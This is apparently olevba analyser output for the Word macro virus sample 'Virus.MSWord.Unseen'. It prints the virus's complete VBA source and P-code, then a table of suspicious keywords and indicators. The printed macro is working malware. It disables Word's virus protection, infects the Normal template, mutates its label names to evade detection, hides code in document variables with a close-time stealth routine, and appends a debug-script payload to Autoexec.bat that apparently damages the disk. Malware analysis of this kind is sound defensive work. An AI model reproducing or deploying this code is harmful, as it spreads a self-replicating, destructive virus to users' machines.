olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Unseen
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Unseen - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
ICheck = True
PRSWDDVQXO:          Options.VirusProtection = False
QFEHHO:          Randomize Timer
PJINRABRK:           ActInstalled = False
JVTEXSBBO:          Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
COCJDH:          Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule
DNDMIXDBGS:
NCSEFPU:          NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 1)
MDKFFRP:          AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1)
EPYVTAIMGWX:
SJXEXX:          If UCase(NI) = "ICHECK = TRUE" Then NormInstalled = True
GTLVMKUDNPJ:          If UCase(AI) = "ICHECK = TRUE" Then ActInstalled = True
KEHVNSE:
XUFXDXFCO:          If NormInstalled = False Then
DIAOTPT:              Set Infection = NormCarrier
SNFFNPQEG:              Set Carrier = ActCarrier
KGBUFG:          Else
GQDGXBR:              Set Infection = ActCarrier
FPDAXRGSU:              Set Carrier = NormCarrier
QOPHEKXS:          End If
ACXORCSXWH:
CFVEBOO:          If NormInstalled = True And ActInstalled = True Then
HSHEKWAAFSR:              If Int(Rnd * 24) > CInt(Hour(Time)) Then
XMBTVRUNT:              IAddressI = Int(Rnd * 9999): Open "C:\Demon.scr" For Output As #1
YWOXNWTU:              Print #1, "w " & IAddressI & " 02 01 02": Open "C:\Autoexec.bat" For Append As #2
ATRHTYWP:              Print #1, "q"
JBPEEWNJ:              Print #2, "debug <demon.scr"
CPFGMR:              Close
COMVWFYSS:              End If
AIYYDGOH:          End If
PBPGJG:
VXVHGXTDCH:          With Carrier
DHSFYUAVPKC:          UECode1 = .Lines(1, 1) & Chr(13)
JDCCBCLMOTV:          UECode2 = .Lines(2, 1) & Chr(13)
HKQPMOI:          UECode3 = .Lines(3, 1) & Chr(13)
YAOFDXXF:          UECode = UECode1 & UECode2 & UECode3
FQMFGS:          For X = 5 To .CountOfLines - 1
QSHTNQCRXAK:              VCCode = .Lines(X, 1)
NFDUEAATV:              If VCCode = "End Sub" Then Exit For
HNXINGRSS:              For I = 1 To 20
TYMDLUVXOUV:                  If Mid(VCCode, I, 1) = ":" Then VCCode = Right(VCCode, Len(VCCode) - I)
EHVSCARXAGG:              Next I
MMLFSTFP:              factor = ""
QTOHLGMQOQI:              For Y = 1 To Int(Rnd * 6) + 6
DQSETFS:                  factor = factor & Chr(Int(Rnd * 25) + 65)
BXGFNALFQ:              Next Y
QIMSFYXM:              make_morph = factor & ": "
OCKCWXRGUD:
EHHMRKF:              VirCode = VirCode & make_morph & " " & VCCode & Chr(13)
YCSHNNHAAIM:          Next X
MRDUETBCWL:          VirCode = UECode & VirCode & "End Sub"
MIGGCFOITVF:          End With
FUWVJAI:
ABMNNOWS:          With Infection
DKROFG:              .DeleteLines 1, .CountOfLines
XKCQGBN:              .InsertLines 1, VirCode
FXUXJGVB:          End With
YIYFIDGQN:
LEUHNDS:          StealthModul = "by Lord Arz"
YAQXONMT:          ResetMe = "Private Sub Document_Close()" & Chr(13)
RTVORVPI:          ResetMe = ResetMe & "Beginn:                                                                                                                                                                                                                                                        If ShowVisualBasicEditor = True Then Normal.ThisDocument.Variables(" & Chr(34) & "VCode" & Chr(34) & ").Value = (" & Chr(34) & "Msgbox " & Chr(34) & Chr(34) & "Seven deadly sins, seven ways to win, seven holy path to hell, seven downward slopes, seven blodied hopes, seven are your burnig fires, seven your desires...." & Chr(34) & ")" & Chr(13)
NKWEQDXWG:          ResetMe = ResetMe & "With ThisDocument.VBProject.VBComponents(1).CodeModule" & Chr(13)
JUTTASR:          ResetMe = ResetMe & ".DeleteLines 1, .CountOfLines" & Chr(13)
AGABUAO:          ResetMe = ResetMe & ".InsertLines 1, ThisDocument.Variables(1).Value" & Chr(13)
IIFTIC:          ResetMe = ResetMe & "End With" & Chr(13)
QYQXQV:          ResetMe = ResetMe & "ThisDocument.Save" & Chr(13)
LWCFBTQB:          ResetMe = ResetMe & "End Sub"
PAOAEE:
SSPSNFTOFSS:          For X = 1 To ThisDocument.Variables.Count
AECLNHYK:          DoEvents
SPQCRW:              ThisDocument.Variables(X).Delete
BMEEGLPAJ:          Next X
KQUOMIJ:
IOMHGP:          With ActCarrier
PJEFSKHM:              .DeleteLines 1, .CountOfLines
YWBMUN:              .InsertLines 1, ResetMe
KMJUFXNFQEO:          End With
EPGHGEMYEYU:
NEODAXB:          With NormCarrier
WFVMQWG:              .DeleteLines 1, .CountOfLines
PFYKSOX:              .InsertLines 1, ResetMe
RJULJDHYBKQ:          End With
LJQJGFLW:
IGOAFLRPXW:          DoEvents
PUQFYJMTOF:
FJRIEYLO:          ActiveDocument.Variables.Add "VCode", VirCode
FHUKCIQDFKS:          Normal.ThisDocument.Variables.Add "VCode", VirCode
VQPYANC:
GUVXSBFRX:          ActiveDocument.Save
KGGPOTU:          NormalTemplate.Save
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Unseen
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 203448 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitVarSpecial (True)
' 	St ICheck 
' Line #3:
' 	Label PRSWDDVQXO 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	Label QFEHHO 
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #5:
' 	Label PJINRABRK 
' 	LitVarSpecial (False)
' 	St ActInstalled 
' Line #6:
' 	Label JVTEXSBBO 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ActCarrier 
' Line #7:
' 	Label COCJDH 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NormCarrier 
' Line #8:
' 	Label DNDMIXDBGS 
' Line #9:
' 	Label NCSEFPU 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St NI 
' Line #10:
' 	Label MDKFFRP 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St AI 
' Line #11:
' 	Label EPYVTAIMGWX 
' Line #12:
' 	Label SJXEXX 
' 	Ld NI 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000D "ICHECK = TRUE"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstalled 
' 	EndIf 
' Line #13:
' 	Label GTLVMKUDNPJ 
' 	Ld AI 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000D "ICHECK = TRUE"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActInstalled 
' 	EndIf 
' Line #14:
' 	Label KEHVNSE 
' Line #15:
' 	Label XUFXDXFCO 
' 	Ld NormInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #16:
' 	Label DIAOTPT 
' 	SetStmt 
' 	Ld NormCarrier 
' 	Set Infection 
' Line #17:
' 	Label SNFFNPQEG 
' 	SetStmt 
' 	Ld ActCarrier 
' 	Set Carrier 
' Line #18:
' 	Label KGBUFG 
' 	ElseBlock 
' Line #19:
' 	Label GQDGXBR 
' 	SetStmt 
' 	Ld ActCarrier 
' 	Set Infection 
' Line #20:
' 	Label FPDAXRGSU 
' 	SetStmt 
' 	Ld NormCarrier 
' 	Set Carrier 
' Line #21:
' 	Label QOPHEKXS 
' 	EndIfBlock 
' Line #22:
' 	Label ACXORCSXWH 
' Line #23:
' 	Label CFVEBOO 
' 	Ld NormInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #24:
' 	Label HSHEKWAAFSR 
' 	Ld Rnd 
' 	LitDI2 0x0018 
' 	Mul 
' 	FnInt 
' 	Ld Time 
' 	ArgsLd Hour 0x0001 
' 	Coerce (Int) 
' 	Gt 
' 	IfBlock 
' Line #25:
' 	Label XMBTVRUNT 
' 	Ld Rnd 
' 	LitDI2 0x270F 
' 	Mul 
' 	FnInt 
' 	St IAddressI 
' 	BoS 0x0000 
' 	LitStr 0x000C "C:\Demon.scr"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #26:
' 	Label YWOXNWTU 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "w "
' 	Ld IAddressI 
' 	Concat 
' 	LitStr 0x0009 " 02 01 02"
' 	Concat 
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #27:
' 	Label ATRHTYWP 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "q"
' 	PrintItemNL 
' Line #28:
' 	Label JBPEEWNJ 
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "debug <demon.scr"
' 	PrintItemNL 
' Line #29:
' 	Label CPFGMR 
' 	CloseAll 
' Line #30:
' 	Label COMVWFYSS 
' 	EndIfBlock 
' Line #31:
' 	Label AIYYDGOH 
' 	EndIfBlock 
' Line #32:
' 	Label PBPGJG 
' Line #33:
' 	Label VXVHGXTDCH 
' 	StartWithExpr 
' 	Ld Carrier 
' 	With 
' Line #34:
' 	Label DHSFYUAVPKC 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St UECode1 
' Line #35:
' 	Label JDCCBCLMOTV 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St UECode2 
' Line #36:
' 	Label HKQPMOI 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St UECode3 
' Line #37:
' 	Label YAOFDXXF 
' 	Ld UECode1 
' 	Ld UECode2 
' 	Concat 
' 	Ld UECode3 
' 	Concat 
' 	St UECode 
' Line #38:
' 	Label FQMFGS 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0005 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #39:
' 	Label QSHTNQCRXAK 
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St VCCode 
' Line #40:
' 	Label NFDUEAATV 
' 	Ld VCCode 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #41:
' 	Label HNXINGRSS 
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	For 
' Line #42:
' 	Label TYMDLUVXOUV 
' 	Ld VCCode 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld VCCode 
' 	Ld VCCode 
' 	FnLen 
' 	Ld I 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	St VCCode 
' 	EndIf 
' Line #43:
' 	Label EHVSCARXAGG 
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	Label MMLFSTFP 
' 	LitStr 0x0000 ""
' 	St factor 
' Line #45:
' 	Label QTOHLGMQOQI 
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0006 
' 	Add 
' 	For 
' Line #46:
' 	Label DQSETFS 
' 	Ld factor 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St factor 
' Line #47:
' 	Label BXGFNALFQ 
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	Label QIMSFYXM 
' 	Ld factor 
' 	LitStr 0x0002 ": "
' 	Concat 
' 	St make_morph 
' Line #49:
' 	Label OCKCWXRGUD 
' Line #50:
' 	Label EHHMRKF 
' 	Ld VirCode 
' 	Ld make_morph 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld VCCode 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St VirCode 
' Line #51:
' 	Label YCSHNNHAAIM 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #52:
' 	Label MRDUETBCWL 
' 	Ld UECode 
' 	Ld VirCode 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St VirCode 
' Line #53:
' 	Label MIGGCFOITVF 
' 	EndWith 
' Line #54:
' 	Label FUWVJAI 
' Line #55:
' 	Label ABMNNOWS 
' 	StartWithExpr 
' 	Ld Infection 
' 	With 
' Line #56:
' 	Label DKROFG 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #57:
' 	Label XKCQGBN 
' 	LitDI2 0x0001 
' 	Ld VirCode 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #58:
' 	Label FXUXJGVB 
' 	EndWith 
' Line #59:
' 	Label YIYFIDGQN 
' Line #60:
' 	Label LEUHNDS 
' 	LitStr 0x000B "by Lord Arz"
' 	St StealthModul 
' Line #61:
' 	Label YAQXONMT 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ResetMe 
' Line #62:
' 	Label RTVORVPI 
' 	Ld ResetMe 
' 	LitStr 0x0142 "Beginn:                                                                                                                                                                                                                                                        If ShowVisualBasicEditor = True Then Normal.ThisDocument.Variables("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "VCode"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000B ").Value = ("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "Msgbox "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x009E "Seven deadly sins, seven ways to win, seven holy path to hell, seven downward slopes, seven blodied hopes, seven are your burnig fires, seven your desires...."
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ResetMe 
' Line #63:
' 	Label NKWEQDXWG 
' 	Ld ResetMe 
' 	LitStr 0x0036 "With ThisDocument.VBProject.VBComponents(1).CodeModule"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ResetMe 
' Line #64:
' 	Label JUTTASR 
' 	Ld ResetMe 
' 	LitStr 0x001D ".DeleteLines 1, .CountOfLines"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ResetMe 
' Line #65:
' 	Label AGABUAO 
' 	Ld ResetMe 
' 	LitStr 0x002F ".InsertLines 1, ThisDocument.Variables(1).Value"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ResetMe 
' Line #66:
' 	Label IIFTIC 
' 	Ld ResetMe 
' 	LitStr 0x0008 "End With"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ResetMe 
' Line #67:
' 	Label QYQXQV 
' 	Ld ResetMe 
' 	LitStr 0x0011 "ThisDocument.Save"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ResetMe 
' Line #68:
' 	Label LWCFBTQB 
' 	Ld ResetMe 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St ResetMe 
' Line #69:
' 	Label PAOAEE 
' Line #70:
' 	Label SSPSNFTOFSS 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd Variables 
' 	MemLd Count 
' 	For 
' Line #71:
' 	Label AECLNHYK 
' 	ArgsCall DoEvents 0x0000 
' Line #72:
' 	Label SPQCRW 
' 	Ld X 
' 	Ld ThisDocument 
' 	ArgsMemLd Variables 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #73:
' 	Label BMEEGLPAJ 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' 	Label KQUOMIJ 
' Line #75:
' 	Label IOMHGP 
' 	StartWithExpr 
' 	Ld ActCarrier 
' 	With 
' Line #76:
' 	Label PJEFSKHM 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #77:
' 	Label YWBMUN 
' 	LitDI2 0x0001 
' 	Ld ResetMe 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #78:
' 	Label KMJUFXNFQEO 
' 	EndWith 
' Line #79:
' 	Label EPGHGEMYEYU 
' Line #80:
' 	Label NEODAXB 
' 	StartWithExpr 
' 	Ld NormCarrier 
' 	With 
' Line #81:
' 	Label WFVMQWG 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #82:
' 	Label PFYKSOX 
' 	LitDI2 0x0001 
' 	Ld ResetMe 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #83:
' 	Label RJULJDHYBKQ 
' 	EndWith 
' Line #84:
' 	Label LJQJGFLW 
' Line #85:
' 	Label IGOAFLRPXW 
' 	ArgsCall DoEvents 0x0000 
' Line #86:
' 	Label PUQFYJMTOF 
' Line #87:
' 	Label FJRIEYLO 
' 	LitStr 0x0005 "VCode"
' 	Ld VirCode 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0002 
' Line #88:
' 	Label FHUKCIQDFKS 
' 	LitStr 0x0005 "VCode"
' 	Ld VirCode 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0002 
' Line #89:
' 	Label VQPYANC 
' Line #90:
' 	Label GUVXSBFRX 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #91:
' 	Label KGGPOTU 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #92:
' 	EndSub 
' Line #93:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|IOC       |Demon.scr           |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |demon.scr           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

